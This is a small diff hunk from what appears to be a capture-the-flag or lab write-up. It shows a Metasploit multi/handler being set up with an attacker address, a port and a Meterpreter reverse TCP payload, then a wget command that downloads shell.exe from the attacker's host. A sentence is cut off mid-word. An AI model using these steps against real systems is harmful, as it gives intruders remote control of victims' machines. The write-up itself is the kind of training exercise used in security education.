@@ -221,10 +221,10 @@ msf exploit(multi/handler) > set LHOST tun0
 LHOST => 10.10.14.61
 msf exploit(multi/handler) > set LPORT 1337
 LPORT => 1337
-msf exploit(multi/handler) > 
+msf exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
 ```
 
-Ill set all the correct options that were set in msfvenom
+Ill set all the correct options that were set in msfvenom and then run with listener wi
 
 ```python
 wget http://10.10.14.61/shell.exe -o shell.exe
